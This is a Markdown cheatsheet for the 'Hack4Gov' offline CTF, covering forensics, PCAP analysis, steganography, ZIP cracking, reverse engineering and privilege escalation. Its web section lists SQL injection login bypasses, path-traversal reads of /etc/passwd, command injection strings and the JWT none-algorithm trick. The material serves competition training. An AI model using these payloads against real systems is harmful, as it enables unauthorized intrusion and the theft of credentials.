# Hack4Gov Master Offline CTF Cheatsheet
> Complete offline competition quick-reference guide for Forensics, Network PCAPs, Steganography, Web Exploitation, and Reverse Engineering.

---

## 1. File Signatures & Header Forensics (Magic Bytes)

When files are corrupted or disguised (e.g. an ELF or ZIP renamed to `.pdf` or `.png`), inspect the first 16 bytes:
```bash
# View file header in hex:
xxd -l 16 file.bin
# OR
head -c 16 file.bin | xxd
```

### Common Magic Byte Signatures
| File Type | Header Bytes (Hex) | ASCII / Trailer |
| :--- | :--- | :--- |
| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` (End: `49 45 4E 44 AE 42 60 82` / `IEND`) |
| **JPEG / JPG** | `FF D8 FF E0` or `FF D8 FF E1` | `....` (End: `FF D9`) |
| **GIF** | `47 49 46 38 37 61` or `47 49 46 38 39 61` | `GIF87a` / `GIF89a` |
| **PDF** | `25 50 44 46` | `%PDF` (End: `%%EOF`) |
| **ZIP / DOCX / APK** | `50 4B 03 04` | `PK..` |
| **ELF (Linux Executable)**| `7F 45 4C 46` | `.ELF` |
| **Windows EXE / DLL** | `4D 5A` | `MZ` |
| **7-Zip** | `37 7A BC AF 27 1C` | `7z..` |
| **GZIP** | `1F 8B 08` | `...` |
| **PCAP** | `D4 C3 B2 A1` or `A1 B2 C3 D4` | Standard libpcap |
| **PCAPNG** | `0A 0D 0D 0A` | Next Generation PCAP |

### Header Repair Quick Fix (Python One-Liner)
If a PNG header is corrupted (e.g., set to zero or wrong bytes):
```python
# Fix PNG header:
python -c '
with open("corrupted.png", "r+b") as f:
    f.seek(0)
    f.write(bytes.fromhex("89504E470D0A1A0A"))
'
```

---

## 2. File Carving & Embedded Data Extraction

```bash
# 1. Print all readable strings (flags, URLs, comments):
strings -n 8 target_file | grep -iE "flag|hack4gov|pass|user|key"

# 2. Scan and auto-extract embedded files (ZIPs inside images, hidden binaries):
binwalk -e target_file

# 3. Alternative carver for headers (images, documents, archives):
foremost -i target_file -o output_dir/

# 4. View detailed image metadata (GPS, author, timestamps, hidden comments):
exiftool target_file.jpg
```

---

## 3. Wireshark & Network PCAP Analysis

### Essential Display Filters
| Goal | Wireshark Filter |
| :--- | :--- |
| **Find HTTP POST Logins** | `http.request.method == "POST"` |
| **Search Packet Contents for Flag** | `frame contains "hack4gov" || frame contains "flag"` |
| **Filter by Specific TCP Stream** | `tcp.stream eq 0` (Right click packet $\rightarrow$ Follow $\rightarrow$ TCP Stream) |
| **Inspect DNS Exfiltration** | `dns.flags.response == 0` |
| **Extract Transferred Files** | `File -> Export Objects -> HTTP / SMB / IMF` |
| **Filter Specific IP/Port** | `ip.addr == 10.10.10.5 && tcp.port == 80` |

### Tshark Command-Line One-Liners
```bash
# Print all HTTP POST request bodies from PCAP:
tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data

# Extract all unique DNS queries (checking for DNS tunnel / base64 exfiltration):
tshark -r capture.pcap -T fields -e dns.qry.name | sort -u
```

---

## 4. Steganography (Images, Audio, ZIPs)

### A. Image Steganography
```bash
# 1. StegSolve (Color plane browser, LSB extractor, frame merger):
java -jar Tools/Forensics/stegsolve.jar

# 2. Zsteg (Fast PNG/BMP LSB inspection):
zsteg -a image.png

# 3. Steghide (Extract password-protected JPEG payload):
steghide extract -sf image.jpg -p ""
# If password required, crack with wordlist:
# steghide extract -sf image.jpg -p "<PASSWORD>"

# 4. Outguess (Extract payload from JPEG):
outguess -r image.jpg extracted_flag.txt
```

### B. Audio Steganography & Signals
* **Morse Code Audio / Text Signals**:
  ```bash
  # 1. Live interactive listener REPL (Auto-detects Morse vs Text):
  python Tools/Crypto/morse.py -l

  # 2. Interactive mouse & keyboard tapper (Left Click: '.', Right Click: '-', Space: Break):
  python Tools/Crypto/morse.py -t -s

  # 3. Automatic pulse decoder from .wav audio recording:
  python Tools/Crypto/morse.py -a audio_challenge.wav

  # 4. Live real-time microphone audio Morse listener:
  python Tools/Crypto/morse.py --mic

  # 5. Direct decode / encode:
  python Tools/Crypto/morse.py -d "... --- ..."
  python Tools/Crypto/morse.py -e "HACK4GOV{FLAG}" -s

  # 6. TypeScript real-time listener & transcript logger:
  node Tools/Crypto/morse.ts --listen
  node Tools/Crypto/morse.ts --listen --transcript session.log
  ```
* **Sonic Visualiser**:
  - Open `.wav` file $\rightarrow$ `Pane` $\rightarrow$ `Add Spectrogram` $\rightarrow$ Change channel to All.
  - Look for text or numbers written in high-frequency audio spectra.
* **DTMF Tones (Dial Tones)**:
  - If audio sounds like telephone keypad beeps: use an online/offline DTMF decoder.

### C. ZIP / Archive Cracking
```bash
# Crack encrypted ZIP using rockyou.txt:
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt target.zip

# Or using zip2john:
zip2john target.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 5. Web Exploitation Quick-Reference

### A. SQL Injection Authentication Bypasses
Test in username/password login fields:
```sql
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
' UNION SELECT null, null, null --
' OR '1'='1
```

### B. Local File Inclusion (LFI) & Path Traversal
```
../../../../etc/passwd
/etc/passwd
/var/log/apache2/access.log
php://filter/convert.base64-encode/resource=index.php
```
*(Decodes base64 returned to read server source code).*

### C. Command Injection Bypasses
```bash
; id
| id
$(id)
`id`
%0a id
;cat$IFS/etc/passwd
```

### D. JWT (JSON Web Token) Quick Inspection
A JWT consists of 3 Base64URL parts: `HEADER.PAYLOAD.SIGNATURE`.
- **None Algorithm Attack**: Change header `{"alg":"HS256"}` to `{"alg":"none"}` and strip signature.
- **Payload Editing**: Decode payload in CyberChef $\rightarrow$ change `"role":"user"` to `"role":"admin"`.

---

## 6. Reverse Engineering & Binary Triage

```bash
# 1. Identify architecture and binary format:
file binary_name

# 2. Check binary security protections (PIE, Canary, NX):
checksec --file=binary_name

# 3. Search strings for hardcoded flags or credentials:
strings -a binary_name | grep -iE "flag|hack4gov|pass|key"

# 4. Trace dynamic library and system calls:
ltrace ./binary_name    # Shows strcmp, strncmp, printf (often leaks flag comparison!)
strace ./binary_name    # Shows file read/open/socket operations

# 5. Decompilation Workflow (Ghidra):
# 1. Create project -> Import binary.
# 2. Auto-analyze -> Look at Symbol Tree (Filter for 'main', 'validate', 'check').
# 3. Review the C decompiler window on the right.
```

---

## 7. Linux Privilege Escalation (Post-Exploitation)

```bash
# 1. Check user sudo privileges:
sudo -l

# 2. Find SUID binaries (executables running as root):
find / -perm -4000 -type f 2>/dev/null

# 3. Look up SUID binary bypasses on GTFOBins:
# https://gtfobins.github.io/

# 4. Check writable /etc/passwd or scheduled cron jobs:
cat /etc/crontab
ls -la /etc/cron.*
```
